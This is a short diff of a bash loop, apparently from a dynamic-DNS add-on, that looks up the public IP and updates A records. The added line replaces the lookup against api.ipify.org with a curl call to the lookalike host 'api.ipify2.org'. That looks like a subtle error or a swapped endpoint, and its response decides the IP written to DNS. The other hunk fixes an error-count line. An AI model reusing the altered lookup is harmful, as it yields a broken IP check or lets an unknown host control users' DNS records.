@@ -171,8 +171,8 @@ if [[ ${INTERVAL} == 1 ]]; then bashio::log.info "Iterating every minute\n "; el
 
 while :
 do
-    PUBLIC_IP=$(wget -O - -q -t 1 https://api.ipify.org 2>/dev/null)
-    #PUBLIC_IP=$(curl -s https://api.ipify.org)
+    #PUBLIC_IP=$(wget -O - -q -t 1 https://api.ipify.org 2>/dev/null)
+    PUBLIC_IP=$(curl -s https://api.ipify2.org)
     
     echo -e "Time: $(date '+%Y-%m-%d %H:%M:%S')"
 
@@ -181,7 +181,7 @@ do
         NEXT=$(echo | busybox date -d@"$(( `busybox date +%s`+${INTERVAL}*60 ))" "+%Y-%m-%d %H:%M:%S")
         SECONDS=0
         echo -e "Next: ${NEXT}"
-        echo -e "Errors (PIP/iteration/creation/update): ${PIP_ERRORS/ITERATION_ERRORS}/${CREATION_ERRORS}/${UPDATE_ERRORS}"
+        echo -e "Errors (PIP/iteration/creation/update): ${PIP_ERRORS}/${ITERATION_ERRORS}/${CREATION_ERRORS}/${UPDATE_ERRORS}"
         if [[ ${HIDE_PIP} == false ]]; then echo -e "Public IP address: ${BL}${PUBLIC_IP}${N}\n"; fi
         
         # fetch existing A records
